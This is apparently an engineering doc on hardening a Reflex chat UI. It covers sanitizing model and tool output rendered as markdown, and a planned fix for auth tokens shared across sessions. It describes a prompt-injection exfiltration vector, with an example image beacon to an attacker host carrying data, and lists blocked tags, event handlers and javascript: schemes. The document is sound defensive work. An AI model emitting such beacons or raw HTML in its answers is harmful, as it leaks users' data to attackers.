# Frontend hardening (Reflex UI)

## Markdown sanitization — done

Untrusted content (model answers, SQL result tables, web/tool output) is rendered
through `rx.markdown`, whose react-markdown stack runs with `rehype-raw` (raw HTML
passthrough) and auto-loads remote images — a prompt-injection exfiltration / XSS
vector (an injected answer can embed `![](https://attacker/beacon.png?data=…)` or
raw HTML that loads/executes on render).

`ocd_app/format.py::sanitize_markdown()` neutralizes the loading/executing vectors
before render, leaving ordinary markdown intact:

- remote images `![](http(s)://…)` / `![](//…)` → alt text only (no beacon)
- `<script>…</script>` and remote-loading / executing tags (`img`, `iframe`, `embed`,
  `object`, `link`, `svg`, `video`, `audio`, `source`, `style`, `meta`, `base`,
  `form`, `input`, `frame`, `frameset`, `applet`)
- inline event handlers (`onerror=`, `onload=`, …)
- dangerous URL schemes (`javascript:`, `vbscript:`, `data:text/html`) → `blocked:`

It is applied at every markdown render path in `state.py` — the streamed answer and
thinking deltas (`_append_delta`), the direct final, and the SQL result table. The
function is idempotent, so re-running it on the accumulating stream buffer each delta
is safe (partial patterns accumulate until complete, then get neutralized). User and
error bubbles render via `rx.text` (already escaped) and are not markdown. Source
favicons no longer render a remote `<img>` (the URL came from untrusted web results) —
a static globe icon is used instead.

**Complementary defense (recommended, not yet added):** a client-side `rehype-sanitize`
on the markdown component plus a CSP (`img-src 'self' data:; connect-src 'self'`).
Server-side sanitization is the primary control; these are defense-in-depth.

**Verification note:** `sanitize_markdown` is unit-tested (`frontend/tests/test_sanitize.py`)
and the changed files were syntax-checked, but the Reflex UI was **not run** in this
environment — please verify rendering by running the app.

## Session token handling (`_TOKEN`) — documented, NOT yet fixed

`ocd_app/api_client.py` keeps the auth token (and base URL) in **module globals**
(`_TOKEN`, `_BASE`), set by `configure()` on every gated page load. Reflex runs as one
server process serving all browser sessions, so with more than one concurrent signed-in
user the last writer wins: outbound requests are attributed to whichever token was
written last — a session/identity mix and token leak.

**Severity: low for this product.** It only bites a multi-user *hosted* Reflex
deployment with Google OAuth enabled. The default local single-user run leaves auth
disabled and `_TOKEN = None` (benign). Treat it as a blocker only if the Reflex UI is
ever served to multiple authenticated users in one process.

**Refactor plan:**

1. Keep the token only in per-session Reflex state — it already lives in
   `AppState.auth_token` (an `rx.Cookie`); stop mirroring it into a module global.
2. Make the API layer session-scoped: pass the token (and base URL) explicitly into
   each call instead of reading `_TOKEN`/`_BASE`. Either thread `token`/`base_url`
   params through the `api_client` functions, or introduce a small `Client` object
   built from `AppState` per request that constructs
   `httpx.AsyncClient(base_url=…, headers={"Authorization": f"Bearer {token}"})`.
3. Route `_headers()` and `run_agent_stream()` through that per-call token; delete the
   `_TOKEN`/`_BASE` globals and `configure()`.
4. Verify by signing in as two users concurrently and confirming each user's requests
   are attributed to their own token.

Until then, run one authenticated session per process (or complete the refactor above)
if the Reflex UI is exposed to multiple users.
